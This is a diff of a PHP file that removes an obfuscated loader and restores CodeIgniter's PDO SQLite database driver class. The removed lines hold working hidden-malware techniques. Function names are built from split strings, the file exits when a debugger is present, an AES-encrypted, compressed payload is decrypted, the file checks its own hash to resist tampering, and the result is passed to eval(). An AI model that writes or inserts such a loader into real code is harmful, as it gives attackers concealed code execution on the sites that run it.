@@ -1,28 +1,192 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ggo3f9qn=('bas'.'e64'.'_de'.'cod'.'e');
-$_xaf98u0n=('gzu'.'nco'.'mpr'.'ess');
-$_ufa5nonj=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_wdfbwq47='stGawajX';
-$_d6gtrmo6='0v8HiYgv';
-$_q5ptchi9='Tt5EGKhIuOQ=';
-$_obm3h2q9='9REFtQsV';
-$_s2bf1wav='o2dUbs4n';
-$_ge03nb48='iQm4zC7E';
-$_akwwmmog='jlBpkw==';
-$_snv68tt2='om1DQIOC';
-$_zeq37cj5=$_ggo3f9qn($_s2bf1wav.$_wdfbwq47.$_obm3h2q9.$_d6gtrmo6.$_q5ptchi9);
-$_a83lshtt=$_ggo3f9qn($_ge03nb48.$_snv68tt2.$_akwwmmog);
-$_h4rn8waq=$_ggo3f9qn('Y802sjbaPDaG40JurmPM4Zbph58xNU/g38fnu1pQOJXbQ/6zPxAO20LPGvg48hgRcK8sTi/XZs2B23rvsJf0lc4uGyZApZjjin6UoMxUEgQb3T5cbELR+bOIfPSc0Lrf2Zlf121aCYXwWyzFf0uA2pxBpANfjzxlHP5Ii7T/1yOzNBnkaf+Fs9WLGRnBwnWHiIF7AQyYGVXAc7mXXOwest8bqmhDZtM/DvhOoTPKngeZLSEOqvvAHXG4Ek6850XZnpcHJrj2ZmwBfN6dN86VhjdYu8J84fyB2fMl8UWL50EX5CGwnTYktRfuG4rmlwnpP95NSagn9HOE+mfdVkhVeZCtkqN/oLdK65b5vvCB0yqt224StAsQVOtiRl1G56mMmDV7G85XrVsKTA3YxBCGY3rSCQ0h4bnEh8CVJnFSwRDqfU5LXTdyLKtPZrMiuO0wBwbdvB3KNSfmf6fDk3Fr62Q61nfl7ezbfZ2vG+eeaumtb/VcjxvlNruT6qnB3Khz1+hoW+htl4OjwxcWJ4jAT3gZq6IIhvSxaqGRwxj0zOgy41xHoUGs3URklhQarV8CkWhTMqz3hxFu1cjyl9wCTe3VOFwnEZGqHQMBd68XjiPb8K4XZDvTbkV34+3k2SaoyWTGKevB4jRkSwG896qxQcPs3VGjst4mgi5tQwJfGC/fN/NTaWYondUJHFbPP+H3/n4LzvyGM/5k/TtMrKfmG+mcLRTpVnhGKp4vxYjzFY1Jgn6o4N0oQorAjnz7HVEGqOKcIn55vOcqYxzoHCvdn6jJhrg3FSEhiOPhTkhq31g6MEGTasKhbyyq6KeRRSVY0pYZg0yLK27BwsfImJevfcE90Qpq8AA1JWDbGHC+xd8VcVbAbIO4Dtwlu40Cag3sS4vfIdPfPC5sp8be3zGz3Eh/ZTe/oq9w7KvoxLmdEHdtaBCXIlJ1w55JLNWeXx3KBZBslF/3AZgcUbqIpQTzneAYgVRVVIVI9SZEN+PrBRDZPTCnJFdm24H1iAUWrboHD4Z/xEKH4gU5qakoIJiEq6dykvWssS610Zyem9wuF4wREPjgV8RaB0s/sNky/Eto2V/4jDe8VTv/r/uQKp6W2ne5GwitNw53gxOZxPCTVJsLfafmQp8PRHliFzUwBYu/');
-$_blrx9l9i=$_ufa5nonj($_h4rn8waq,'aes-256-cbc',$_zeq37cj5,OPENSSL_RAW_DATA,$_a83lshtt);
-if($_blrx9l9i===false){exit;}
-$_fucnp3eg=$_xaf98u0n($_blrx9l9i);
-if($_fucnp3eg===false){exit;}
-$_vdou0xqh='7880e9f15d7af0f3a4b712fb37cee0586b67a768db9c85569ea9eb7806dc0890';
-$_yf7n5v9g=@file_get_contents(__FILE__);
-if($_yf7n5v9g!==false){
-$_un4huwft=str_replace($_vdou0xqh,"0000000000000000000000000000000000000000000000000000000000000000",$_yf7n5v9g);
-$_qbcva2eo=hash("sha256",$_un4huwft);
-if($_qbcva2eo!==$_vdou0xqh){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_pdo_sqlite_driver extends CI_DB_pdo_driver {
+
+
+
+
+
+public $subdriver = 'sqlite';
+
+
+
+
+
+
+protected $_random_keyword = array('RANDOM()', 'RANDOM()');
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (empty($this->dsn))
+{
+$this->dsn = 'sqlite:';
+if (empty($this->database) && empty($this->hostname))
+{
+$this->database = ':memory:';
 }
-eval($_fucnp3eg);
+$this->database = empty($this->database) ? $this->hostname : $this->database;
+}
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SELECT "NAME" FROM "SQLITE_MASTER" WHERE "TYPE" = \'table\'';
+if ($prefix_limit === TRUE && $this->dbprefix !== '')
+{
+return $sql.' AND "NAME" LIKE \''.$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+public function list_fields($table)
+{
+
+if (isset($this->data_cache['field_names'][$table]))
+{
+return $this->data_cache['field_names'][$table];
+}
+if (($result = $this->query('PRAGMA TABLE_INFO('.$this->protect_identifiers($table, TRUE, NULL, FALSE).')')) === FALSE)
+{
+return FALSE;
+}
+$this->data_cache['field_names'][$table] = array();
+foreach ($result->result_array() as $row)
+{
+$this->data_cache['field_names'][$table][] = $row['name'];
+}
+return $this->data_cache['field_names'][$table];
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+if (($query = $this->query('PRAGMA TABLE_INFO('.$this->protect_identifiers($table, TRUE, NULL, FALSE).')')) === FALSE)
+{
+return FALSE;
+}
+$query = $query->result_array();
+if (empty($query))
+{
+return FALSE;
+}
+$retval = array();
+for ($i = 0, $c = count($query); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $query[$i]['name'];
+$retval[$i]->type = $query[$i]['type'];
+$retval[$i]->max_length = NULL;
+$retval[$i]->default = $query[$i]['dflt_value'];
+$retval[$i]->primary_key = isset($query[$i]['pk']) ? (int) $query[$i]['pk'] : 0;
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+protected function _replace($table, $keys, $values)
+{
+return 'INSERT OR '.parent::_replace($table, $keys, $values);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _truncate($table)
+{
+return 'DELETE FROM '.$table;
+}
+}
